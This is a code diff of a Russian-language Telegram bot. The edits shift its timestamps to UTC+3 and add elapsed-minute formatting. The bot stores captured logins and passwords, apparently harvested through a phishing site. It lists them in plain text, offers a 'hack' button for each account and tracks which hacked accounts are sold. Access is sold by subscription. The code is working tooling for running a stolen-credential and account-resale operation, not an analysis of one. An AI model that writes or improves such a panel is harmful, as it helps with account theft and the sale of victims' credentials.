@@ -20,6 +20,10 @@ bot = telebot.TeleBot(TOKEN)
 # === Переменные для техперерыва ===
 tech_break = None
 
+# === Установка часового пояса (UTC+3) ===
+def get_current_time():
+    return datetime.now() + timedelta(hours=3)  # Добавляем 3 часа к UTC для UTC+3
+
 # === Инициализация базы данных ===
 def get_db_connection():
     try:
@@ -46,7 +50,7 @@ def init_db():
         print("Создаем таблицу 'hacked_accounts', если не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                      (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
-        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
+        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
         print(f"Устанавливаем Создателя для {ADMIN_CHAT_ID}")
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
@@ -79,7 +83,7 @@ def get_user(chat_id):
             print(f"Жестко задаем Создателя для {chat_id}")
             return {
                 'prefix': 'Создатель',
-                'subscription_end': datetime.now() + timedelta(days=3650),
+                'subscription_end': get_current_time() + timedelta(days=3650),
                 'site_clicks': 0,
                 'password_views': 0
             }
@@ -112,7 +116,7 @@ def save_user(chat_id, prefix, subscription_end=None):
     try:
         c = conn.cursor()
         if subscription_end is None:
-            subscription_end = datetime.now().isoformat()
+            subscription_end = get_current_time().isoformat()
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                   (chat_id, prefix, subscription_end, prefix, subscription_end))
@@ -160,9 +164,10 @@ def save_credentials(login, password):
         return False
     try:
         c = conn.cursor()
+        added_time = get_current_time().isoformat()
         c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                   "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
-                  (login, password, datetime.now().isoformat(), password, datetime.now().isoformat()))
+                  (login, password, added_time, password, added_time))
         conn.commit()
         conn.close()
         print(f"Учетные данные сохранены: login={login}, password={password}")
@@ -196,11 +201,12 @@ def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
         return False
     try:
         c = conn.cursor()
+        hack_date = get_current_time().isoformat()
         c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                   "VALUES (%s, %s, %s, %s, %s, %s) "
                   "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
-                  (login, password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id,
-                   password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id))
+                  (login, password, hack_date, prefix, sold_status, linked_chat_id,
+                   password, hack_date, prefix, sold_status, linked_chat_id))
         conn.commit()
         conn.close()
         print(f"Взломанный аккаунт сохранен: login={login}, password={password}, sold_status={sold_status}")
@@ -295,6 +301,13 @@ def get_all_users():
         conn.close()
         return []
 
+# === Форматирование времени с минутами ===
+def format_time_with_minutes(iso_time):
+    added_time = datetime.fromisoformat(iso_time)
+    current_time = get_current_time()
+    minutes_passed = int((current_time - added_time).total_seconds() / 60)
+    return f"{added_time.strftime('%Y-%m-%d %H:%M:%S')} ({minutes_passed} мин назад)"
+
 # === Проверка доступа ===
 def check_access(chat_id, command):
     global tech_break
@@ -305,15 +318,15 @@ def check_access(chat_id, command):
         user = get_user(chat_id)
     
     if tech_break and chat_id != ADMIN_CHAT_ID:
-        time_left = (tech_break - datetime.now()).total_seconds() / 60
+        time_left = (tech_break - get_current_time()).total_seconds() / 60
         if time_left > 0:
             return f"⏳ Сейчас идет техперерыв. Окончание через {int(time_left)} минут."
     if not user or user['prefix'] == 'Посетитель':
         if command in ['start', 'menu', 'getchatid']:
             return None
         return "🔒 Вы можете купить подписку у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
-    if user['subscription_end'] and user['subscription_end'] < datetime.now():
-        save_user(chat_id, 'Посетитель', datetime.now())
+    if user['subscription_end'] and user['subscription_end'] < get_current_time():
+        save_user(chat_id, 'Посетитель', get_current_time())
         return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
     if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
         return "🔒 Доступно только для Админа и Создателя!"
@@ -404,16 +417,16 @@ def menu_cmd(message):
     print(f"Данные пользователя для {chat_id}: {user}")
     
     if user:
-        time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
+        time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
         time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
         response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
         
         global tech_break
         if tech_break:
-            tech_time_left = (tech_break - datetime.now()).total_seconds() / 60
+            tech_time_left = (tech_break - get_current_time()).total_seconds() / 60
             print(f"Техперерыв активен, осталось: {tech_time_left} минут")
             if tech_time_left > 0:
-                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+2), осталось {int(tech_time_left)} мин."
+                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+3), осталось {int(tech_time_left)} мин."
             else:
                 tech_break = None
                 print("Техперерыв истек, сбрасываем на None")
@@ -473,8 +486,8 @@ def techstop_cmd(message):
         bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
         return
     minutes = int(args[0])
-    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)
-    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Окончание: {tech_break.strftime('%H:%M')} (UTC+2)")
+    tech_break = get_current_time() + timedelta(minutes=minutes)
+    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Окончание: {tech_break.strftime('%H:%M')} (UTC+3)")
 
 @bot.message_handler(commands=['techstopoff'])
 def techstopoff_cmd(message):
@@ -504,7 +517,8 @@ def passwords_cmd(message):
     response = "🔑 Список паролей:\n"
     markup = types.InlineKeyboardMarkup()
     for login, password, added_time in credentials:
-        response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
+        formatted_time = format_time_with_minutes(added_time)
+        response += f"Логин: {login} | Пароль: {password} | Добавлен: {formatted_time}\n"
         markup.add(
             types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_cred_{login}"),
             types.InlineKeyboardButton(f"Взломать {login}", callback_data=f"hack_cred_{login}")
@@ -528,7 +542,8 @@ def hacked_cmd(message):
     response = "🔓 Взломанные аккаунты:\n"
     markup = types.InlineKeyboardMarkup()
     for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
-        response += (f"Логин: {login} | Пароль: {password} | Дата: {hack_date} | "
+        formatted_time = format_time_with_minutes(hack_date)
+        response += (f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | "
                      f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
         markup.add(
             types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
@@ -554,7 +569,7 @@ def database_cmd(message):
         response += "Пусто\n"
     else:
         for chat_id, prefix, subscription_end, site_clicks, password_views in users:
-            time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
+            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
             response += f"Chat ID: {chat_id} | Префикс: {prefix} | Подписка: {time_left} дней\n"
     
     # Пароли
@@ -564,7 +579,8 @@ def database_cmd(message):
         response += "Пусто\n"
     else:
         for login, password, added_time in credentials:
-            response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
+            formatted_time = format_time_with_minutes(added_time)
+            response += f"Логин: {login} | Пароль: {password} | Добавлен: {formatted_time}\n"
     
     # Взломанные аккаунты
     hacked_accounts = get_hacked_accounts()
@@ -573,7 +589,8 @@ def database_cmd(message):
         response += "Пусто\n"
     else:
         for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
-            response += f"Логин: {login} | Пароль: {password} | Статус: {sold_status}\n"
+            formatted_time = format_time_with_minutes(hack_date)
+            response += f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | Статус: {sold_status}\n"
 
     markup = types.InlineKeyboardMarkup()
     markup.add(
@@ -679,7 +696,7 @@ def add_user_cmd(message):
         bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префикс> <дни>")
         return
     target_chat_id, prefix, days = args[0], args[1], int(args[2])
-    subscription_end = datetime.now() + timedelta(days=days)
+    subscription_end = get_current_time() + timedelta(days=days)
     save_user(target_chat_id, prefix, subscription_end)
     bot.reply_to(message, f"✅ Добавлен пользователь {target_chat_id} с префиксом {prefix} на {days} дней.")
 
@@ -772,7 +789,7 @@ def admin_cmd(message):
         return
     response = "👑 Панель администратора\nСписок пользователей:\n"
     for chat_id, prefix, subscription_end, site_clicks, password_views in users:
-        time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
+        time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
         response += (f"Chat ID: {chat_id}\n"
                      f"Префикс: {prefix}\n"
                      f"Подписка: {time_left} дней\n"
@@ -796,7 +813,7 @@ def adprefix_cmd(message):
     if prefix not in ["Админ", "Пользователь"]:
         bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь")
         return
-    subscription_end = datetime.now() + timedelta(days=days)
+    subscription_end = get_current_time() + timedelta(days=days)
     save_user(target_chat_id, prefix, subscription_end)
     bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс {prefix} на {days} дней.")
 
@@ -813,7 +830,7 @@ def delprefix_cmd(message):
         bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
         return
     target_chat_id = args[0]
-    save_user(target_chat_id, "Посетитель", datetime.now())
+    save_user(target_chat_id, "Посетитель", get_current_time())
     bot.reply_to(message, f"✅ Префикс пользователя {target_chat_id} сброшен до Посетитель.")
 
 init_db()  # Инициализация при запуске
